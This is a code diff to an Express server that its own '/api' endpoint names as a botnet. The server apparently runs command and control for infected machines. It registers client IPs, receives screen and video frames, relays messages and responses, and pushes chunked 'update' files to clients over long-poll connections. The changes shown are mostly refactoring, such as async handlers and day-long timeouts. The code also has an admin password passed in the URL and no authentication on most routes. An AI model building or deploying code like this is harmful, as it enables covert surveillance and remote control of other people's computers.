@@ -9,11 +9,11 @@ const path = require("path");
 const app = express();
 const PORT = process.env.PORT || 3000;
 const NODE_ENV = process.env.NODE_ENV || "development";
-const ip = require("./ip.json");
 const screens = require("./screens.json");
 const videos = require("./videos.json");
 const update = require("./update.json");
 const versions = require("./versions.json");
+var ip = require("./ip.json");
 var messages = require("./messages.json");
 var responses = require("./responses.json");
 require('dotenv').config();
@@ -21,7 +21,7 @@ app.set("port", PORT);
 app.set("env", NODE_ENV);
 app.use(logger("tiny"));
 app.use(bodyParser.text({ limit: "50mb" }));
-app.post("/api/v1/video/:id", (req, res, next) => {
+app.post("/api/v1/video/:id", async (req, res, next) => {
     try {
         const client = videos.find(_frame => _frame.id === Number(req.params.id))
         client.currentframe = JSON.parse(req.body);
@@ -32,7 +32,7 @@ app.post("/api/v1/video/:id", (req, res, next) => {
     }
     res.end();
 });
-app.get("/api/v1/video/:id", (req, res, next) => {
+app.get("/api/v1/video/:id", async (req, res, next) => {
     try {
         const client = videos.find(_frame => _frame.id === Number(req.params.id))
         res.json(client);
@@ -41,7 +41,7 @@ app.get("/api/v1/video/:id", (req, res, next) => {
     }
     res.end();
 });
-app.post("/api/v1/screens/:id", (req, res, next) => {
+app.post("/api/v1/screens/:id", async (req, res, next) => {
     var _sid = 0;
     try {
         const screen = screens.find(
@@ -72,7 +72,7 @@ app.post("/api/v1/screens/:id", (req, res, next) => {
     res.json(_sid);
     res.end();
 });
-app.post("/api/v1/screens/:id/:sid", (req, res, next) => {
+app.post("/api/v1/screens/:id/:sid", async (req, res, next) => {
     try {
         const screen = screens.find(
             _screen => _screen.id === Number(req.params.id)
@@ -97,7 +97,7 @@ app.post("/api/v1/screens/:id/:sid", (req, res, next) => {
         next(e);
     }
 });
-app.get("/api/v1/screens/:id", (req, res, next) => {
+app.get("/api/v1/screens/:id", async (req, res, next) => {
     try {
         const playerStats = screens.find(
             screens => screens.id === Number(req.params.id)
@@ -113,7 +113,7 @@ app.get("/api/v1/screens/:id", (req, res, next) => {
     }
     res.end();
 });
-app.get("/api/v1/client", (req, res, next) => {
+app.get("/api/v1/client", async (req, res, next) => {
     try {
         const playerStats = require("./ip.json");
         res.json(playerStats);
@@ -130,11 +130,11 @@ app.get("/api/v1/messages", (req, res, next) => {
     }
     res.end();
 });
-app.get("/api/v1/responses", (req, res, next) => {
+app.get("/api/v1/responses", async (req, res, next) => {
     res.json(responses);
     res.end();
 });
-app.get("/api/v1/responses/:id", (req, res, next) => {
+app.get("/api/v1/responses/:id", async (req, res, next) => {
     try {
         const resp = responses.find(_resp => _resp.id === Number(req.params.id));
         if (!resp) {
@@ -147,7 +147,7 @@ app.get("/api/v1/responses/:id", (req, res, next) => {
         next(e);
     }
 });
-app.get("/api/v1/messages/:id", (req, res, next) => {
+app.get("/api/v1/messages/:id", async (req, res, next) => {
     try {
         const playerStats = messages.find(
             message => message.id === Number(req.params.id)
@@ -163,7 +163,7 @@ app.get("/api/v1/messages/:id", (req, res, next) => {
     }
     res.end();
 });
-app.post("/api/v1/client", (req, res, next) => {
+app.post("/api/v1/client", async (req, res, next) => {
     try {
         const newIP = {
             id: ip.length,
@@ -179,7 +179,7 @@ app.post("/api/v1/client", (req, res, next) => {
     }
     res.end();
 });
-app.post("/api/v1/messages", (req, res, next) => {
+app.post("/api/v1/messages", async (req, res, next) => {
     try {
         const newMessage = {
             id: messages.length,
@@ -196,12 +196,12 @@ app.post("/api/v1/messages", (req, res, next) => {
     }
     res.end();
 });
-app.delete("/api/v1/messages", (req, res, next) => {
+app.delete("/api/v1/messages", async (req, res, next) => {
     messages = [];
 
     res.end();
 });
-app.get("/api", function (req, res) {
+app.get("/api", async (req, res) => {
     var json = {
         uri: "http://botnet-sandbox.glitch.me/",
         version: 1,
@@ -214,54 +214,20 @@ app.get("/api", function (req, res) {
 
     res.end();
 });
-app.get("/api/v1/responses/:id/:rid", (req, res, next) => {
-    var response;
-    try {
-        const resp = responses.find(_resp => _resp.id === Number(req.params.id));
-        if (!resp) {
-            const err = new Error("client not found");
-            err.status = 404;
-            throw err;
-        }
-        response = resp.responses;
-    } catch (e) {
-        next(e);
-    }
-    try {
-        const ressponse = response.find(
-            _resp => _resp.rid === Number(req.params.rid)
-        );
-        if (!ressponse) {
-            const err = new Error("response not found");
-            err.status = 404;
-            throw err;
-        }
-        res.json(ressponse);
-    } catch (e) {
-        next(e);
-    }
-    res.end();
+app.get("/api/v1/responses/:id", async (req, res, next) => {
+
 });
-app.post("/api/v1/responses/:id", (req, res, next) => {
+app.post("/api/v1/response/", async (req, res, next) => {
     try {
-        const resp = responses.find(_resp => _resp.id === Number(req.params.id));
-        if (!resp) {
-            responses.push({
-                id: Number(req.params.id),
-                responses: [
-                    {
-                        rid: 0,
-                        response: JSON.parse(req.body).response
-                    }
-                ]
-            });
-        } else {
-            resp.responses.push({
-                rid: resp.responses.length,
-                response: JSON.parse(req.body).response
-            });
-        }
-        respresall(req.params.id, { "rid": resp.responses.length - 1, "response": JSON.parse(req.body).response });
+        const newResponse = {
+            id: JSON.parse(req.body).id,
+            response: JSON.parse(req.body).response
+        };
+        responses.push(newResponse);
+        var sresponses = JSON.stringify(responses);
+        fs.writeFileSync("responses.json", sresponses);
+        respresall(newResponse);
+        res.status(201).json(ip.length - 1);
     } catch (e) {
         next(e);
     }
@@ -269,12 +235,12 @@ app.post("/api/v1/responses/:id", (req, res, next) => {
     fs.writeFileSync("responses.json", sresponses);
     res.end();
 });
-app.delete("/api/v1/responses", (req, res, next) => {
+app.delete("/api/v1/responses", async (req, res, next) => {
     responses = [];
 
     res.end();
 });
-app.delete("/api/v1/client/:id", (req, res, next) => {
+app.delete("/api/v1/client/:id", async (req, res, next) => {
     ip.splice(ip.indexOf(ip.find(x => x.id === Number(req.params.id))), 1);
     var sip = JSON.stringify(ip);
     fs.writeFileSync("ip.json", sip);
@@ -282,14 +248,14 @@ app.delete("/api/v1/client/:id", (req, res, next) => {
 
     res.end();
 });
-app.get("/api/v1/admin/:password", (req, res, next) => {
+app.get("/api/v1/admin/:password", async (req, res, next) => {
     if (process.env.SECRET === String(req.params.password)) {
         res.json(true);
     } else {
         res.json(false);
     }
 });
-app.get("/api/v1/ip", (req, res, next) => {
+app.get("/api/v1/ip", async (req, res, next) => {
     try {
         const err = new Error("I’m a teapot");
         err.status = 418;
@@ -299,15 +265,15 @@ app.get("/api/v1/ip", (req, res, next) => {
     }
     res.end();
 });
-app.get("/sandbox", (req, res, next) => {
+app.get("/sandbox", async (req, res, next) => {
     res.json("Who are you?");
     res.end();
 });
-app.get("/sandbox/:id", (req, res, next) => {
+app.get("/sandbox/:id", async (req, res, next) => {
     res.json(req.params.id);
     res.end();
 });
-app.post("/api/v1/sandbox", (req, res, next) => {
+app.post("/api/v1/sandbox", async (req, res, next) => {
     try {
         if (String(req.body) === "Make a coffee") {
             const err = new Error("I’m a teapot");
@@ -319,11 +285,11 @@ app.post("/api/v1/sandbox", (req, res, next) => {
     }
     res.end();
 });
-app.delete("/sandbox", (req, res, next) => {
+app.delete("/sandbox", async (req, res, next) => {
     res.json("Deleted!");
     res.end();
 });
-app.post("/api/v1/update", (req, res, next) => {
+app.post("/api/v1/update", async (req, res, next) => {
     try {
         update.filename = JSON.parse(req.body).filename;
         update.filebytes = JSON.parse(req.body).filebytes;
@@ -334,7 +300,7 @@ app.post("/api/v1/update", (req, res, next) => {
     }
     res.end();
 });
-app.post("/api/v1/nextupdate", (req, res, next) => {
+app.post("/api/v1/nextupdate", async (req, res, next) => {
     try {
         update.filebytes = update.filebytes.concat(JSON.parse(req.body).filebytes);
         var supdate = JSON.stringify(update);
@@ -344,7 +310,7 @@ app.post("/api/v1/nextupdate", (req, res, next) => {
     }
     res.end();
 });
-app.get("/api/v1/update", (req, res, next) => {
+app.get("/api/v1/update", async (req, res, next) => {
     try {
         res.json(update);
     } catch (e) {
@@ -352,7 +318,7 @@ app.get("/api/v1/update", (req, res, next) => {
     }
     res.end();
 });
-app.get("/api/v1/support/versions/:version", (req, res, next) => {
+app.get("/api/v1/support/versions/:version", async (req, res, next) => {
     try {
         const version = versions.find(x => x.version === String(req.params.version));
         res.json(version);
@@ -362,36 +328,68 @@ app.get("/api/v1/support/versions/:version", (req, res, next) => {
 });
 var httpresponses4mes = [];
 function mesresall(newMessage) {
-    httpresponses4mes.forEach(x => x.json(newMessage));
+    httpresponses4mes.forEach(x => { x.json(newMessage); x.end(); });
     httpresponses4mes = [];
 }
-app.get("/api/v1/listen/messages", (req, res, next) => {
+app.get("/api/v1/listen/messages", async (req, res, next) => {
     try {
+        res.setHeader('connection', 'keep-alive');
+        res.setTimeout(86400000, function () {
+            let err = new Error('Request Timeout');
+            err.status = 408;
+            next(err);
+        });
+        req.setTimeout(86400000, function () {
+            let err = new Error('Request Timeout');
+            err.status = 408;
+            next(err);
+        });
         httpresponses4mes.push(res);
     } catch (e) {
         next(e);
     }
 });
 var httpresponse4res = [];
-function respresall(id, newResponse) {
-    var element = httpresponse4res.find(x => x.id === id);
-    element.res.json(newResponse);
-    httpresponse4res = httpresponse4res.splice(httpresponse4res.indexOf(element), 1);
+function respresall(newResponse) {
+    httpresponse4res.forEach(x => { x.json(newResponse); x.end(); });
+    httpresponse4res = [];
 }
-app.get("/api/v1/listen/responses/:id", (req, res, next) => {
+app.get("/api/v1/listen/responses/", async (req, res, next) => {
     try {
-        httpresponse4res.push({ "id": req.params.id, "res":res });
+        res.setHeader('connection', 'keep-alive');
+        res.setTimeout(86400000, function () {
+            let err = new Error('Request Timeout');
+            err.status = 408;
+            next(err);
+        });
+        req.setTimeout(86400000, function () {
+            let err = new Error('Request Timeout');
+            err.status = 408;
+            next(err);
+        });
+        httpresponse4res.push(res);
     } catch (e) {
         next(e);
     }
 });
 var httpresponse4clients = [];
 function clientsresall(newClients) {
-    httpresponse4clients.forEach(x => x.json(newClients))
+    httpresponse4clients.forEach(x => { x.json(newClients); x.end(); })
     httpresponse4clients = [];
 }
-app.get("/api/v1/listen/clients", (req, res, next) => {
+app.get("/api/v1/listen/clients", async (req, res, next) => {
     try {
+        res.setHeader('connection', 'keep-alive');
+        res.setTimeout(86400000, function () {
+            let err = new Error('Request Timeout');
+            err.status = 408;
+            next(err);
+        });
+        req.setTimeout(86400000, function () {
+            let err = new Error('Request Timeout');
+            err.status = 408;
+            next(err);
+        });
         httpresponse4clients.push(res);
     } catch (e) {
         next(e);
@@ -412,17 +410,17 @@ app.use((err, req, res, next) => {
         }
     });
 });
-var server = app.listen(PORT, () => {
+var server = app.listen(PORT, async () => {
     console.log(
         `Express Server started on Port ${app.get(
             "port"
         )} | Environment : ${app.get("env")}`
     );
 });
-server.on("connection", (listener) => {
+server.timeout = 86400000;
+server.on("connection", async (listener) => {
     console.log("Someone has connected")
-    listener.setKeepAlive(true);
-    listener.on("data", (data) => {
+    listener.on("data", async (data) => {
         console.log("data recived " + data);
     });
 });
